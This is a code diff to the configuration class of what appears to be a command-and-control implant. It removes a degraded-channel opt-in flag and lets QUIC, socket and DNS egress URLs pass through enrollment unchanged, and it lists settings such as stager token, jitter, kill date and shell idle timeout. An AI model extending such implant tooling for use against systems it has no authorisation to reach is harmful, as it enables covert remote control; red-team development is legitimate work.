@@ -91,16 +91,6 @@ internal sealed class Config
     public string Mode { get; set; } = BeaconModes.Stream;
 
     /// <summary>
-    /// The degraded-channel opt-in (architecture.md Sec 10.3): a poll-mode
-    /// implant that carries it advertises the store-and-forward capability
-    /// ("channels.poll") and accepts the interactive verbs over its check-in
-    /// cycles -- operator input arrives with the next check-in, at the
-    /// cycle's latency, the deliberate tradeoff the bake names. Baked at
-    /// build time; flag/env override.
-    /// </summary>
-    public bool DegradedChannels { get; set; }
-
-    /// <summary>
     /// The verb set baked in at build time (the profile's "verbs" key,
     /// architecture.md Sec 5.2/5.3): the class's reduced set plus the
     /// contract-only verbs no class gates, so an out-of-tree handler compiled in
@@ -127,14 +117,15 @@ internal sealed class Config
     /// Composes an egress entry's enroll host (the URL with any path stripped)
     /// and the transport profile's enroll path, so a profiled implant enrolls
     /// against the path it was baked with rather than the teamserver's default
-    /// route -- whichever entry of the egress walk is current. A quic-schemed
-    /// entry rides exactly as baked: it is the frame exchange's dial
-    /// (architecture.md Sec 8, enrollment over QUIC), and the profile's HTTP
-    /// knobs apply to no part of it.
+    /// route -- whichever entry of the egress walk is current. A quic-,
+    /// socket-, or dns-schemed entry rides exactly as baked: each is its own
+    /// exchange's dial (architecture.md Sec 8 -- enrollment over QUIC, the
+    /// stream check-in, and the DNS grammar, where the path IS the zone), and
+    /// the profile's HTTP knobs apply to no part of it.
     /// </summary>
     public static string ResolveEnrollUrl(string enrollUrl, TransportProfile transport)
     {
-        if (BeaconUrl.IsQuic(enrollUrl))
+        if (BeaconUrl.IsQuic(enrollUrl) || BeaconUrl.IsSocket(enrollUrl) || BeaconUrl.IsDns(enrollUrl))
             return enrollUrl;
 
         var host = enrollUrl;
@@ -196,7 +187,6 @@ internal sealed class Config
                 Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
             },
             Mode = NormalizeMode(Env("ROD_MODE", BeaconModes.Stream)),
-            DegradedChannels = EnvFlag("ROD_DEGRADED_CHANNELS"),
             ClassVerbs = ParseCommaList(Env("ROD_VERBS", string.Empty)),
             Quiet = EnvFlag("ROD_QUIET"),
         };
@@ -323,7 +313,7 @@ internal sealed class Config
         ROD_STAGER_TOKEN, ROD_SLEEP, ROD_JITTER, ROD_MODE, ROD_KILL_DATE,
         ROD_CA_CERT, ROD_ENROLL_PATH, ROD_USER_AGENT, ROD_HEADERS as JSON,
         ROD_ENVELOPE, ROD_REQUEST_TIMEOUT, ROD_VERBS, ROD_QUIET, ROD_ENVELOPE_KEY,
-        ROD_CHECKIN_ENVELOPE, ROD_DEGRADED_CHANNELS, ROD_SHELL_IDLE_SECONDS).
+        ROD_CHECKIN_ENVELOPE, ROD_SHELL_IDLE_SECONDS).
         """;
 
     // Validates the check-in mode; anything but stream/poll is a usage error
